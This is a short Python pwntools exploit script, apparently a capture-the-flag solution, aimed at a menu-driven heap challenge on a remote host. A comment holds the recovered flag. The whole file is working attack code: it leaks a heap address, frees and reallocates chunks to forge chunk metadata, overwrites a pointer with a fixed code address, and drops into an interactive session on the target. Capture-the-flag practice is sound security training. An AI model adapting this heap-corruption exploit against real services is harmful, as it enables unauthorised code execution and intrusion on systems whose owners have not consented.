from pwn import *
# flag{Th3 mon3y y0u just withdraw is a gift to y0u. Save it! G00d luck!}
#s = remote('192.168.33.10',1234)
s = remote('110.10.147.27', 9595)
def alloc(index,dollors,name,memo):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(':')
  s.send(str(dollors))
  s.recvuntil(':')
  s.send(name)
  s.recvuntil(':')
  s.send(memo)

def delete_low(index):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(index))

def view(index):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil(':')
  s.sendline(str(index))

def edit(index,dollors,name,memo):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(':')
  s.send(str(dollors))
  s.recvuntil(':')
  s.send(name)
  s.recvuntil(':')
  s.send(memo)

alloc(1,0x1,"A"*0x10,"1234")
alloc(3,1234,p64(0x31),"C"*0x8+p64(0x51))
view(1)
heap = u64(s.recvuntil('[-] memo')[0x38:0x3c]+'\x00\x00\x00\x00') - 0x40
print hex(heap)
delete_low(1)
alloc(4,0x1,"1234","1234")
delete_low(1)
edit(4,heap+0x60,"\x00","\x00")
alloc(1,0x1,"1234","1234")
alloc(2,0x1,"A"*0x8+p64(0x04007C0),"1234")
s.interactive()
